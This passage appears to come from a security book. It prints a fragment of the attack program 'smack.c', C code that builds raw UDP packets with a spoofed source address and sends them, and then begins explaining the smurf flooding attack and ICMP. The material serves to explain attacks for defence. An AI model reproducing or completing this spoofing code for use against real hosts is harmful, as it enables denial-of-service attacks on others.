```
iph->ip_p = IPPROTO_UDP;
iph->ip_src = src;
dst.s_addr = inet_addr(ip);
if (dst.s_addr == -1) {
    printf("Invalid destination IP: %s\n", ip);
}
addr.sin_port = htons(port);
addr.sin_addr.s_addr = dst.s_addr;
iph->ip_dst = dst;
#ifdef BSD
    udp->uh_dport = htons(dp);
    if (mode == 0) {
        udp->uh_ulen = htons(sizeof *udp + 12);
        udp->uh_sport = htons(rand());
    }
    else {
        udp->uh_ulen = htons(sizeof *udp + strlen(conn_pack1));
        udp->uh_sport = htons(27001);
    }
#else
    udp->dest = htons(dp);
    if (mode == 0) {
        udp->len = htons(sizeof *udp + 12);
        udp->source = htons(rand());
    }
    else {
        udp->len = htons(sizeof *udp + strlen(conn_pack1));
        udp->source = htons(27001);
    }
#endif
    if (mode == 0) {
        memcpy(udp + 1, conn_pack0, 12);
        ret = sendto(s, pack, P50, 0, (struct sockaddr *)&addr, sizeof(addr));
    }
    else {
        memcpy(udp + 1, conn_pack1, strlen(conn_pack1));
        ret = sendto(s, pack, P51, 0, (struct sockaddr *)&addr, sizeof(addr));
        if (ret == -1) {
            perror("sendto");
            exit(-1);
        }
    }

```

To fully recognize the threat level of smack.c, further examination of its functionality is in order. Earlier in this book, flooding techniques, such as the infamous smurf attack, were described. To summarize, the smurf attack is when an attacker spoofs the source field of ICMP echo packets (with a target address), and sends them to a broadcast address. The result is usually disastrous, as the target receives replies from all sorts of interfaces on the local segment.

The Internet Control Message Protocol (ICMP) sends message packets, reporting errors, and other pertinent information back to the sending station or source. This mechanism is implemented by hosts